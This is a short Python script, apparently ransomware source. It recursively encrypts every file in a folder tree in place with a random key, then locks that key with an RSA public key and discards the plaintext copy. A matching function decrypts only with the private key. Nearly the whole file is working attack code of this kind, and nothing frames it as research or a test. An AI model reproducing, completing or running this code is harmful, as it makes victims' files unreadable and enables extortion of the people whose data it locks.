#nocode
from encrypt_file import edFile
import os, time, random, rsa

time.clock = time.time

alphabets = "abcdefghijklmnopqrstuvwxyz1234567890=-_,./=+*"
global randomKey
randomKey = "".join(random.choices(alphabets, k = 128))

ed = edFile(randomKey)

def encrypt_folder(folder):
	contents = os.listdir(folder)
	for c in contents:
		f = os.path.join(folder, c)
		if os.path.isfile(f):
			e = ed.encrypt(f)
			open(f, "wb").write(bytes(e, encoding = "utf-8"))
		else:
			encrypt_folder(f)

def encryptKey():
	global randomKey
	public_key = rsa.PublicKey.load_pkcs1(open("publicKey", "r").read().encode("utf8"))
	ed.key = rsa.encrypt(randomKey.encode("utf8"), public_key)
	randomKey = None

def decrypt_folder(folder, privKey):
	key = rsa.PrivateKey.load_pkcs1(open(privKey, "r").read().encode("utf8"))
	contents = os.listdir(folder)
	for c in contents:
		f = os.path.join(folder, c)
		if os.path.isfile(f):
			e = open(f, "rb").read().decode()
			d = ed.decrypt(e, key)
			open(f, "wb").write(d)
		else:
			decrypt_folder(f, privKey)